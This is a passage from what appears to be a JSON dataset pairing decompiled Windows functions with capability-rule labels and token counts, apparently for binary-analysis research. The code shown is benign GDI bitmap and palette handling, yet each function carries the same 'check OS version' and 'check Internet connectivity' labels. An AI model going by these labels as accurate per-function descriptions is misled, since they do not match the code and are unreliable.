fcn.0041b994();\n    *in_FS_OFFSET = uVar6;\n    fcn.00402f1c(0x42839e);\n    return;\n}\n",
        "token_count": 803
    },
    "004285c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004285c4(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    puStack20 = 0x4285d4;\n    var_8h = fcn.00419c24();\n    uStack24 = 0x428662;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    iVar2 = *(var_8h + 8) + -1;\n    puStack20 = &stack0xfffffffc;\n    if (-1 < iVar2) {\n        do {\n            var_4h = iVar2;\n            puStack32 = 0x4285ff;\n            var_ch = fcn.004198b4();\n            puStack32 = 0x42860a;\n            cVar1 = fcn.00425558();\n            if (cVar1 != '\\0') {\n                uStack36 = 0x42863a;\n                uStack40 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffd8;\n                puStack32 = &stack0xfffffffc;\n                fcn.00428754();\n                *in_FS_OFFSET = uStack40;\n                puStack32 = 0x428641;\n                uStack36 = 0x428639;\n                fcn.004255b4();\n                return;\n            }\n            var_4h = var_4h + -1;\n            iVar2 = var_4h;\n        } while (var_4h != -1);\n    }\n    *in_FS_OFFSET = uStack28;\n    puStack20 = 0x428669;\n    uStack24 = 0x428661;\n    fcn.00419c88();\n    return;\n}\n",
        "token_count": 445
    },
    "00428670": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428670(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (in_EAX != 0) {\n        puStack20 = 0x428689;\n        iVar1 = fcn.00419c24();\n        uStack24 = 0x4286e0;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        iVar1 = *(iVar1 + 8) + -1;\n        puStack20 = &stack0xfffffffc;\n        if (-1 < iVar1) {\n            do {\n                iVar2 = fcn.004198b4();\n                if ((*(iVar2 + 0x58) != 0) && (*(*(*(iVar2 + 0x58) + 0x28) + 8) == in_EAX)) {\n                    fcn.00428754();\n                }\n                iVar1 = iVar1 + -1;\n            } while (iVar1 != -1);\n        }\n        *in_FS_OFFSET = uStack28;\n        puStack20 = 0x4286e7;\n        uStack24 = 0x4286df;\n        fcn.00419c88();\n        return;\n    }\n    return;\n}\n",
        "token_count": 316
    },
    "00428754": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428754(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uVar1;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_4h;\n    \n    if (*(in_EAX + 4) != 0) {\n        puStack16 = 0x428771;\n        fcn.0042537c();\n        uStack20 = 0x4287e8;\n        uStack24 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe8;\n        puStack16 = &stack0xfffffffc;\n        if (*(in_EAX + 0x5c) != 0) {\n            puStack16 = &stack0xfffffffc;\n            sub.gdi32.dll_SelectObject(*(in_EAX + 4), *(in_EAX + 0x5c));\n        }\n        if (*(in_EAX + 0x60) != 0) {\n            sub.gdi32.dll_SelectPalette(*(in_EAX + 4), *(in_EAX + 0x60), 0xffffffff);\n        }\n        uVar1 = *(in_EAX + 4);\n        fcn.00425748();\n        sub.gdi32.dll_DeleteDC();\n        fcn.00419c38();\n        *in_FS_OFFSET = uVar1;\n        fcn.004255b4(0x4287ef);\n        return;\n    }\n    return;\n}\n",
        "token_count": 321
    },
    "004287f4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004287f4(void)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    uint uVar3;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffffd8;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x58) != 0) {\n        puStack20 = 0x428812;\n        fcn.0042537c();\n        uStack24 = 0x4288d3;\n        uStack28 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe4;\n        puStack20 = &stack0xfffffffc;\n        fcn.00429c08();\n        fcn.00428670();\n        fcn.00429d08();\n        uVar2 = sub.gdi32.dll_CreateCompatibleDC(0);\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 8);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x5c) = 0;\n        }\n        else {\n            in_stack_ffffffd8 = uVar2;\n            uVar3 = sub.gdi32.dll_SelectObject(uVar2, iVar1);\n            *(in_EAX + 0x5c) = uVar3;\n        }\n        iVar1 = *(*(*(in_EAX + 0x58) + 0x28) + 0x10);\n        if (iVar1 == 0) {\n            *(in_EAX + 0x60) = 0;\n        }\n        else {\n            uVar3 = sub.gdi32.dll_SelectPalette(uVar2, iVar1, 0xffffffff);\n            *(in_EAX + 0x60) = uVar3;\n            sub.gdi32.dll_RealizePalette(uVar2);\n        }\n        fcn.00425748();\n        fcn.00419b9c();\n        *in_FS_OFFSET = in_stack_ffffffd8;\n        fcn.004255b4(0x4288da);\n        return;\n    }\n    return;\n}\n",
        "token_count": 480
    },
    "004288e4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.004288e4(void)\n\n{\n    uint *in_EAX;\n    \n    if ((in_EAX != NULL) && (in_EAX[1] = in_EAX[1] + -1,  in_EAX[1] == 0)) {\n        (***in_EAX)();\n        fcn.00404650();\n    }\n    return;\n}\n",
        "token_count": 81
    },
    "00428a68": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00428a68(void)\n\n{\n    int32_t in_EAX;\n    \n    if (((*(in_EAX + 0x28) & 3) != 0) && (*(in_EAX + 0x40) == 0)) {\n        if (*(in_EAX + 0x26) == 0x10) {\n            *(in_EAX + 0x40) = 0xf800;\n            *(in_EAX + 0x44) = 0x7e0;\n            *(in_EAX + 0x48) = 0x1f;\n        }\n        else if (*(in_EAX + 0x26) == 0x20) {\n            *(in_EAX + 0x40) = 0xff0000;\n            *(in_EAX + 0x44) = 0xff00;\n            *(in_EAX + 0x48) = 0xff;\n        }\n    }\n    return;\n}\n",
        "token_count": 212
    },
    "00428ab4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00428ab4(int32_t arg_8h, int32_t arg_ch)\n\n{\n    uchar *puVar1;\n    int16_t iVar2;\n    int16_t iVar3;\n    int32_t in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t in_EDX;\n    uint32_t uVar7;\n    uint uVar8;\n    uint *puVar9;\n    uint *puVar10;\n    int32_t *in_FS_OFFSET;\n    uint *puStack312;\n    int32_t iStack308;\n    uchar *puStack304;\n    int32_t iStack300;\n    int32_t iStack296;\n    int32_t iStack292;\n    uint *puStack288;\n    int32_t iStack272;\n    int32_t iStack268;\n    uchar *puStack264;\n    uint *puStack260;\n    int32_t iStack256;\n    int32_t iStack252;\n    uint *puStack248;\n    code *pcStack244;\n    uint *puStack240;\n    uchar *puStack236;\n    int32_t iStack232;\n    int32_t iStack228;\n    uchar *puStack224;\n    int32_t iStack220;\n    uint uStack216;\n    int32_t iStack212;\n    uint uStack208;\n    uchar *puStack204;\n    int32_t iStack200;\n    uint uStack196;\n    uchar *puStack192;\n    int32_t iStack188;\n    uint uStack184;\n    int32_t iStack180;\n    uint uStack176;\n    uint *puStack172;\n    uint lprc;\n    uint lpvObject;\n    int32_t var_84h;\n    int32_t var_80h;\n    int32_t var_74h;\n    int32_t var_70h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    int32_t var_28h;\n    uint *pbmi;\n    int32_t var_20h;\n    int32_t hdcDest;\n    int32_t hdc;\n    uint var_14h;\n    uint var_10h;\n    int32_t hpal;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    puStack236 = &stack0xfffffffc;\n    var_10h = 0;\n    if (((*(arg_ch + 0x18) == 0) || ((*(arg_ch + 0x1c) != 0 && (*(arg_ch + 0x20) != 0)))) &&\n       ((*(arg_ch + 0x18) != 0 || ((*(arg_ch + 4) != 0 && (*(arg_ch + 8) != 0)))))) {\n        puStack172 = 0x428b1c;\n        var_8h = in_EDX;\n        hgdiobj = in_EAX;\n        fcn.00428670();\n        var_70h = 0;\n        if (hgdiobj != 0) {\n            puStack172 = &fcn.00428ab4::lpvObject;\n            uStack176 = 0x54;\n            iStack180 = hgdiobj;\n            uStack184 = 0x428b39;\n            iVar4 = sub.gdi32.dll_GetObjectA();\n            if (iVar4 < 0x18) {\n                uStack184 = 0x428b43;\n                fcn.004259a4();\n            }\n        }\n        uStack184 = 0;\n        iStack188 = 0x428b4a;\n        sub.user32.dll_GetDC();\n        iStack188 = 0x428b4f;\n        iStack188 = fcn.00425ac4();\n        puStack192 = 0x428b5b;\n        hdc = iStack188;\n        sub.gdi32.dll_CreateCompatibleDC();\n        puStack192 = 0x428b60;\n        hdcDest = fcn.00425ac4();\n        uStack196 = 0x429102;\n        iStack200 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff38;\n        if (*(arg_ch + 0x18) < 0x28) {\n            if ((*(arg_ch + 0x10) | *(arg_ch + 0x12)) == 1) {\n                puStack204 = NULL;\n                uStack208 = 1;\n                iStack212 = 1;\n                uStack216 = *(arg_ch + 8);\n                iStack220 = *(arg_ch + 4);\n                puStack224 = 0x428ba7;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateBitmap();\n                puStack224 = 0x428bac;\n                var_10h = fcn.00425ac4();\n            }\n            else {\n                puStack204 = *(arg_ch + 8);\n                uStack208 = *(arg_ch + 4);\n                iStack212 = hdc;\n                uStack216 = 0x428bcb;\n                puStack192 = &stack0xfffffffc;\n                sub.gdi32.dll_CreateCompatibleBitmap();\n                uStack216 = 0x428bd0;\n                var_10h = fcn.00425ac4();\n            }\n            uStack216 = 0x428e1b;\n            fcn.00425ac4();\n            uStack216 = var_10h;\n            iStack220 = hdcDest;\n            puStack224 = 0x428e28;\n            sub.gdi32.dll_SelectObject();\n            puStack224 = 0x428e2d;\n            var_14h = fcn.00425ac4();\n            iStack228 = 0x4290b3;\n            iStack232 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff18;\n            puStack240 = 0x4290a2;\n            pcStack244 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff0c;\n            var_34h = 0;\n            uVar8 = 0;\n            puVar1 = &stack0xfffffffc;\n            puStack224 = &stack0xfffffffc;\n            if (hpal != 0) {\n                puStack248 = NULL;\n                iStack252 = hpal;\n                iStack256 = hdcDest;\n                puStack260 = 0x428e68;\n                puStack224 = &stack0xfffffffc;\n                var_34h = sub.gdi32.dll_SelectPalette();\n                puStack260 = hdcDest;\n                puStack264 = 0x428e74;\n                sub.gdi32.dll_RealizePalette();\n                puVar1 = puStack236;\n            }\n            puStack236 = puVar1;\n            iStack268 = 0x429080;\n            iStack272 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xfffffef0;\n            if (arg_8h == 0) {\n                puStack288 = NULL;\n                iStack292 = 0;\n                iStack296 = hdcDest;\n                iStack300 = 0x428f61;\n                puStack264 = &stack0xfffffffc;\n                sub.gdi32.dll_PatBlt();\n            }\n            else {\n                puStack264 = &stack0xfffffffc;\n                fcn.00424f98();\n                puStack288 = 0x428eb5;\n                fcn.00418464(&fcn.00428ab4::lprc, *(arg_ch + 8));\n                puStack288 = &fcn.00428ab4::lprc;\n                iStack292 = hdcDest;\n                iStack296 = 0x428ec5;\n                sub.user32.dll_FillRect();\n                iStack296 = 0x428ed3;\n                iStack296 = fcn.004241dc();\n                iStack300 = hdcDest;\n                puStack304 = 0x428edd;\n                sub.gdi32.dll_SetTextColor();\n                puStack304 = 0x428ee8;\n                fcn.00424f5c();\n                puStack304 = 0x428eed;\n                puStack304 = fcn.004241dc();\n                iStack308 = hdcDest;\n                puStack312 = 0x428ef7;\n                sub.gdi32.dll_SetBkColor();\n                if ((*(arg_ch + 0x26) == 1) && (*(arg_ch + 0x14) != 0)) {\n                    puStack312 = 0x428f18;\n                    var_30h = fcn.004241dc();\n                    puStack312 = 0x428f26;\n                    fcn.00424f5c();\n                    puStack312 = 0x428f2b;\n                    var_2ch = fcn.004241dc();\n                    puStack312 = &fcn.00428ab4::var_30h;\n                    sub.gdi32.dll_SetDIBColorTable(hdcDest, 0, 2);\n                }\n            }\n            if (hgdiobj != 0) {\n                iStack300 = hdc;\n                puStack304 = 0x428f74;\n                sub.gdi32.dll_CreateCompatibleDC();\n                puStack304 = 0x428f79;\n                var_20h = fcn.00425ac4();\n                iStack308 = 0x429056;\n                puStack312 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xfffffec8;\n                puStack304 = &stack0xfffffffc;\n                sub.gdi32.dll_SelectObject(var_20h, hgdiobj);\n                uVar5 = fcn.00425ac4();\n                if (var_8h != 0) {\n                    uVar8 = sub.gdi32.dll_SelectPalette(var_20h, var_8h, 0);\n                    sub.gdi32.dll_RealizePalette(var_20h);\n                }\n                if (arg_8h != 0) {\n                    uVar6 = fcn.004241dc();\n                    sub.gdi32.dll_SetTextColor(var_20h, uVar6);\n                    fcn.00424f5c();\n                    uVar6 = fcn.004241dc();\n                    sub.gdi32.dll_SetBkColor(var_20h, uVar6);\n                }\n                sub.gdi32.dll_BitBlt(hdcDest, 0, 0, *(arg_ch + 4), *(arg_ch + 8), var_20h, 0, 0, 0xcc0020);\n                if (var_8h != 0) {\n                    sub.gdi32.dll_SelectPalette(var_20h, uVar8, 0xffffffff);\n                }\n                iVar4 = var_20h;\n                sub.gdi32.dll_SelectObject(var_20h, uVar5);\n                fcn.00425ac4();\n                *in_FS_OFFSET = iVar4;\n                uVar8 = sub.gdi32.dll_DeleteDC(var_20h, 0x42905d);\n                return uVar8;\n            }\n            uVar8 = 0;\n            *in_FS_OFFSET = iStack296;\n            puStack288 = 0x429087;\n            if (hpal != 0) {\n                iStack292 = 0xffffffff;\n                iStack296 = var_34h;\n                iStack300 = hdcDest;\n                puStack304 = 0x42907f;\n                uVar8 = sub.gdi32.dll_SelectPalette();\n            }\n            return uVar8;\n        }\n        puStack204 = 0x428be2;\n        puStack192 = &stack0xfffffffc;\n        pbmi = fcn.00402f00();\n        uStack208 = 0x428e0c;\n        iStack212 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffff2c;\n        *(arg_ch + 0x18) = 0x28;\n        *(arg_ch + 0x24) = 1;\n        puStack204 = &stack0xfffffffc;\n        if (*(arg_ch + 0x26) == 0) {\n            uStack216 = 0xc;\n            iStack220 = hdc;\n            puStack224 = 0x428c1b;\n            puStack204 = &stack0xfffffffc;\n            iVar2 = sub.gdi32.dll_GetDeviceCaps();\n            puStack224 = 0xe;\n            iStack228 = hdc;\n            iStack232 = 0x428c28;\n            iVar3 = sub.gdi32.dll_GetDeviceCaps();\n            *(arg_ch + 0x26) = iVar2 * iVar3;\n        }\n        puVar9 = arg_ch + 0x18;\n        puVar10 = pbmi;\n        for (iVar4 = 10; iVar4 != 0; iVar4 = iVar4 + -1) {\n            *puVar10 = *puVar9;\n            puVar9 = puVar9 + 1;\n            puVar10 = puVar10 + 1;\n        }\n        *(arg_ch + 4) = *(arg_ch + 0x1c);\n        *(arg_ch + 8) = *(arg_ch + 0x20);\n        if (*(arg_ch + 0x26) < 9) {\n            if ((*(arg_ch + 0x26) == 1) && ((hgdiobj == 0 || (var_74h == 0)))) {\n                pbmi[10] = 0;\n                pbmi[0xb] = 0xffffff;\n            }\n            else if (hpal == 0) {\n                if (hgdiobj != 0) {\n                    iStack232 = hgdiobj;\n                    puStack236 = hdcDest;\n                    puStack240 = 0x428cd2;\n                    var_14h = sub.gdi32.dll_SelectObject();\n                    if ((var_70h == 0) || (var_74h == 0)) {\n                        puStack240 = NULL;\n                        pcStack244 = pbmi;\n                        puStack248 = NULL;\n                        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n                        iStack252 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n                        iStack256 = 0;\n                        puStack260 = hgdiobj;\n                        puStack264 = hdcDest;\n                        iStack268 = 0x428d23;\n                        sub.gdi32.dll_GetDIBits();\n                    }\n                    else {\n                        puStack240 = pbmi + 10;\n                        pcStack244 = pe_nt_image_headers32;\n                        puStack248 = NULL;\n                        iStack252 = hdcDest;\n                        iStack256 = 0x428cf8;\n                        uVar8 = sub.gdi32.dll_GetDIBColorTable();\n                        *(arg_ch + 0x38) = uVar8;\n                    }\n                    puStack224 = var_14h;\n                    iStack228 = hdcDest;\n                    iStack232 = 0x428d30;\n                    sub.gdi32.dll_SelectObject();\n                }\n            }\n            else {\n                iStack232 = 0x428cb6;\n                fcn.00426260();\n            }\n        }\n        else if (((*(arg_ch + 0x26) == 0x10) || (*(arg_ch + 0x26) == 0x20)) && ((*(arg_ch + 0x28) & 3) != 0)) {\n            iStack232 = 0x428d59;\n            fcn.00428a68();\n            iStack232 = 0x428d6f;\n            fcn.004030fc();\n        }\n        iStack232 = 0;\n        puStack236 = NULL;\n        puStack240 = &fcn.00428ab4::var_28h;\n        pcStack244 = NULL;\n        puStack248 = pbmi;\n        iStack252 = hdc;\n        iStack256 = 0x428d86;\n        sub.gdi32.dll_CreateDIBSection();\n        iStack256 = 0x428d8b;\n        var_10h = fcn.00425ac4();\n        if (var_28h == 0) {\n            iStack256 = 0x428d99;\n            fcn.00425a1c();\n        }\n        if ((((hgdiobj == 0) || (*(arg_ch + 0x1c) != var_84h)) || (*(arg_ch + 0x20) != var_80h)) ||\n           (*(arg_ch + 0x26) < 9)) {\n            *in_FS_OFFSET = iStack252;\n            pcStack244 = 0x428e13;\n            puStack248 = 0x428e0b;\n            uVar8 = fcn.00402f1c();\n            return uVar8;\n        }\n        iStack256 = 0;\n        puStack260 = pbmi;\n        puStack264 = var_28h;\n        uVar7 = *(arg_ch + 0x20) >> 0x1f;\n        iStack268 = (*(arg_ch + 0x20) ^ uVar7) - uVar7;\n        iStack272 = 0;\n        sub.gdi32.dll_GetDIBits();\n        fcn.00404f70();\n        fcn.00404f70();\n    }\n    return var_10h;\n}\n",
        "token_count": 3770
    },
    "00429118": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00429118(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    uint uStack1064;\n    int32_t iStack1060;\n    uchar *puStack1056;\n    int32_t iStack1052;\n    uint uStack1048;\n    uchar *puStack1044;\n    uint uStack1040;\n    \n    puStack1044 = &stack0xfffffbf0;\n    uVar2 = 0;\n    if (in_EAX != 0) {\n        uStack1040 = 0;\n        uStack1048 = 4;\n        puStack1056 = 0x429136;\n        iStack1052 = in_EAX;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if ((iVar1 != 0) && (iStack1052 != 0)) {\n            uStack1048 = CONCAT22(iStack1052, 0x300);\n            puStack1056 = &stack0xfffffbec;\n            iStack1060 = iStack1052;\n            uStack1064 = 0;\n            sub.gdi32.dll_GetPaletteEntries();\n            uVar2 = sub.gdi32.dll_CreatePalette(&stack0xfffffbd8);\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 296
    },
    "0042917c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0042917c(int32_t param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *in_FS_OFFSET;\n    int32_t in_stack_fffffec8;\n    int32_t in_stack_ffffff24;\n    int32_t iStack204;\n    uint uStack200;\n    uchar *puStack196;\n    int32_t iStack192;\n    int32_t iStack188;\n    int32_t iStack184;\n    uint uStack180;\n    uint uStack176;\n    uint uStack172;\n    uint uStack168;\n    uint uStack164;\n    int32_t iStack160;\n    uint uStack156;\n    int32_t iStack152;\n    uint uStack148;\n    uchar *puStack144;\n    uint uStack136;\n    uint *puStack132;\n    uint lpvObject;\n    uint nWidth;\n    uint nHeight;\n    int32_t var_5ch;\n    uint var_58h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    char var_11h;\n    int32_t hdcDest;\n    int32_t hdc;\n    int32_t var_8h;\n    int32_t hgdiobj;\n    \n    hgdiobj = 0;\n    if (in_EAX != 0) {\n        puStack132 = &fcn.0042917c::lpvObject;\n        uStack136 = 0x54;\n        puStack144 = 0x4291a4;\n        iVar1 = sub.gdi32.dll_GetObjectA();\n        if (iVar1 != 0) {\n            puStack144 = 0x4291b3;\n            fcn.00428670();\n            var_8h = 0;\n            hdcDest = 0;\n            uStack148 = 0x429377;\n            iStack152 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff68;\n            uStack156 = 0;\n            iStack160 = 0x4291d2;\n            puStack144 = &stack0xfffffffc;\n            sub.user32.dll_GetDC();\n            iStack160 = 0x4291d7;\n            iStack160 = fcn.00425ac4();\n            uStack164 = 0x4291e3;\n            var_8h = iStack160;\n            sub.gdi32.dll_CreateCompatibleDC();\n            uStack164 = 0x4291e8;\n            hdcDest = fcn.00425ac4();\n            uStack164 = 0;\n            uStack168 = 1;\n            uStack172 = 1;\n            uStack176 = nHeight;\n            uStack180 = nWidth;\n            iStack184 = 0x4291fe;\n            hgdiobj = sub.gdi32.dll_CreateBitmap();\n            if (hgdiobj != 0) {\n                iStack188 = hdcDest;\n                iStack192 = 0x429218;\n                iStack184 = hgdiobj;\n                var_1ch = sub.gdi32.dll_SelectObject();\n                if (param_1 != 0x1fffffff) {\n                    iStack192 = var_8h;\n                    puStack196 = 0x429248;\n                    sub.gdi32.dll_CreateCompatibleDC();\n                    puStack196 = 0x42924d;\n                    hdc = fcn.00425ac4();\n                    uStack200 = 0x42932f;\n                    iStack204 = *in_FS_OFFSET;\n                    *in_FS_OFFSET = &stack0xffffff34;\n                    if (var_5ch == 0) {\n                        var_11h = '\\0';\n                        puStack196 = &stack0xfffffffc;\n                    }\n                    else {\n                        var_11h = '\\x01';\n                        var_58h = 0;\n                        puStack196 = &stack0xfffffffc;\n                        in_EAX = fcn.00428ab4(0, &fcn.0042917c::lpvObject);\n                    }\n                    var_18h = sub.gdi32.dll_SelectObject(hdc, in_EAX);\n                    if (param_2 != 0) {\n                        sub.gdi32.dll_SelectPalette(hdc, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdc);\n                        sub.gdi32.dll_SelectPalette(hdcDest, param_2, 0);\n                        sub.gdi32.dll_RealizePalette(hdcDest);\n                    }\n                    uVar2 = sub.gdi32.dll_SetBkColor(hdc, param_1);\n                    sub.gdi32.dll_BitBlt(hdcDest, 0, 0, nWidth, nHeight, hdc, 0, 0, 0xcc0020);\n                    sub.gdi32.dll_SetBkColor(hdc, uVar2);\n                    if (var_18h != 0) {\n                        in_stack_fffffec8 = hdc;\n                        sub.gdi32.dll_SelectObject(hdc, var_18h);\n                    }\n                    if (var_11h != '\\0') {\n                        sub.gdi32.dll_DeleteObject(in_EAX);\n                    }\n                    *in_FS_OFFSET = in_stack_fffffec8;\n                    uVar2 = sub.gdi32.dll_DeleteDC(hdc, 0x429336);\n                    return uVar2;\n                }\n                iStack192 = 0x42;\n                puStack196 = nHeight;\n                uStack200 = nWidth;\n                iStack204 = 0;\n                sub.gdi32.dll_PatBlt(hdcDest, 0);\n                if (var_1ch != 0) {\n                    in_stack_ffffff24 = hdcDest;\n                    sub.gdi32.dll_SelectObject(hdcDest, var_1ch);\n                }\n            }\n            uVar2 = 0;\n            *in_FS_OFFSET = in_stack_ffffff24;\n            if (hdcDest != 0) {\n                uVar2 = sub.gdi32.dll_DeleteDC(hdcDest, 0x42937e);\n            }\n            if (var_8h != 0) {\n                uVar2 = sub.user32.dll_ReleaseDC(0, var_8h);\n            }\n            return uVar2;\n        }\n    }\n    return hgdiobj;\n}\n",
        "token_count": 1348
    },
    "00429388": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00429388(uint param_1, char param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack28;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00426c60();\n    in_EAX[0xd] = 0x20000000;\n    iVar1 = fcn.00404620();\n    in_EAX[10] = iVar1;\n    fcn.004288e0();\n    if (*0x492bb8 != '\\0') {\n        (**(*in_EAX + 0x70))();\n    }\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack28;\n    }\n    return in_EAX;\n}\n",
        "token_count": 216
    },
    "0042968c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0042968c(int32_t *param_1, int32_t param_2)\n\n{\n    bool bVar1;\n    char cVar2;\n    int32_t *in_EAX;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t arg_2ch;\n    int32_t arg_28h;\n    int32_t iVar5;\n    int32_t iVar6;\n    uint *in_FS_OFFSET;\n    uint uVar7;\n    uint uStack108;\n    uint uStack104;\n    uchar *puStack100;\n    uint *puStack96;\n    uint uStack92;\n    uchar *puStack88;\n    uint uStack84;\n    uint *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    uint var_1ch;\n    uint var_18h;\n    uint var_11h;\n    uint var_dh;\n    char var_9h;\n    uint var_8h;\n    int32_t var_4h;\n    \n    iVar6 = in_EAX[10];\n    uStack48 = 0x4296ae;\n    var_4h = param_2;\n    fcn.0042579c();\n    uStack48 = 0x4296b5;\n    fcn.00429d08();\n    var_8h = 0;\n    var_9h = 0;\n    iVar3 = *(iVar6 + 0x10);\n    if (iVar3 != 0) {\n        uStack48 = 0xffffffff;\n        uStack56 = *(var_4h + 4);\n        uStack60 = 0x4296d4;\n        iStack52 = iVar3;\n        var_8h = sub.gdi32.dll_SelectPalette();\n        uStack60 = *(var_4h + 4);\n        uStack64 = 0x4296e3;\n        sub.gdi32.dll_RealizePalette();\n    }\n    uStack64 = 0xc;\n    uStack68 = *(var_4h + 4);\n    uStack72 = 0x4296f5;\n    var_9h = iVar3 != 0;\n    uStack72 = sub.gdi32.dll_GetDeviceCaps();\n    uStack76 = 0xe;\n    puStack80 = *(var_4h + 4);\n    uStack84 = 0x429704;\n    iVar3 = sub.gdi32.dll_GetDeviceCaps();\n    if ((puStack80 * iVar3 < 9) && (puStack80 * iVar3 < *(iVar6 + 0x2a) * *(iVar6 + 0x28))) {\n        bVar1 = true;\n    }\n    else {\n        bVar1 = false;\n    }\n    if (bVar1) {\n        puStack80 = 